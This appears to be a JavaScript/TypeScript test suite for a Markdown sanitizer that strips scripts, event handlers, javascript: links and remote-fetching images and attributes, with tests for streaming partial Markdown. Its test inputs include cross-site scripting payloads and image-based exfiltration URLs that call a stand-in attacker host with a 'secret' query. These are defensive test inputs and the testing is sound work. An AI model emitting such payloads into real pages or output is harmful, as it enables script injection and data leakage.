import { closeOpenFence, renderMarkdown } from './markdown';

describe('renderMarkdown', () => {
  it('renders bold, lists and code', () => {
    const html = renderMarkdown('**Red:** warm\n\n- one\n- two\n\n`x`');
    expect(html).toContain('<strong>Red:</strong>');
    expect(html).toContain('<li>one</li>');
    expect(html).toContain('<code>x</code>');
  });

  it('strips <script> tags', () => {
    const html = renderMarkdown('hello <script>window.__pwned = 1</script> world');
    expect(html).not.toContain('<script');
    expect(html).not.toContain('__pwned');
    expect(html).toContain('hello');
  });

  it('strips onerror and other event-handler attributes', () => {
    const html = renderMarkdown('<img src=x onerror="window.__pwned=1"> ![a](x "t") <a href="#" onclick="alert(1)">l</a>');
    expect(html.toLowerCase()).not.toContain('onerror');
    expect(html.toLowerCase()).not.toContain('onclick');
  });

  it('drops javascript: links', () => {
    expect(renderMarkdown('[x](javascript:alert(1))').toLowerCase()).not.toContain('javascript:');
  });

  it('opens links in a new tab without leaking the opener', () => {
    expect(renderMarkdown('[a](https://example.com)')).toContain('rel="noopener noreferrer"');
  });

  it('does not execute injected markup when bound to the DOM', () => {
    const w = window as unknown as { __pwned?: number };
    delete w.__pwned;
    const host = document.createElement('div');
    host.innerHTML = renderMarkdown('<img src="data:image/gif;base64,xx" onerror="window.__pwned=1"><script>window.__pwned=1</script>');
    expect(w.__pwned).toBeUndefined();
  });
});

describe('remote images (zero-click exfiltration)', () => {
  it('drops Markdown and raw HTML images, so no remote src survives', () => {
    for (const src of [
      '![x](https://attacker.example/?q=secret)',
      '<img src="https://attacker.example/?q=secret">',
      '<img srcset="https://attacker.example/a.png 1x">',
      '<video src="https://attacker.example/v.mp4"></video>',
    ]) {
      const html = renderMarkdown(src);
      expect(html).not.toContain('<img');
      expect(html).not.toContain('attacker.example');
      expect(html).not.toMatch(/\ssrc(set)?=/);
    }
  });

  it('keeps ordinary links and text', () => {
    const html = renderMarkdown('see [docs](https://example.com) now');
    expect(html).toContain('href="https://example.com"');
    expect(html).toContain('see');
  });
});

describe('partial Markdown while streaming', () => {
  it('closes an unfinished code fence so the layout stays intact', () => {
    expect(closeOpenFence('Here:\n```ts\nconst a = 1;')).toBe('Here:\n```ts\nconst a = 1;\n```');
    expect(closeOpenFence('```\nx\n```')).toBe('```\nx\n```');
    const html = renderMarkdown('Here:\n```ts\nconst a = 1;');
    expect(html).toContain('<pre>');
    expect(html).toContain('const a = 1;');
  });

  it('shows an unclosed ** as text instead of breaking', () => {
    const html = renderMarkdown('This is **bol');
    expect(html).toContain('**bol');
    expect(html).not.toContain('<script');
  });

  it('handles a half-written link and an empty string', () => {
    expect(() => renderMarkdown('see [docs](http://exa')).not.toThrow();
    expect(renderMarkdown('')).toBe('');
  });
});

describe('remote-fetching attributes', () => {
  it('strips background on table/td/th so no attacker URL remains', () => {
    const html = renderMarkdown(
      '<table background="https://attacker.example/x"><tr><td background="https://attacker.example/y">a</td><th background="https://attacker.example/z">b</th></tr></table>',
    );
    expect(html).toContain('<td');
    expect(html).not.toContain('background');
    expect(html).not.toContain('attacker.example');
  });
});
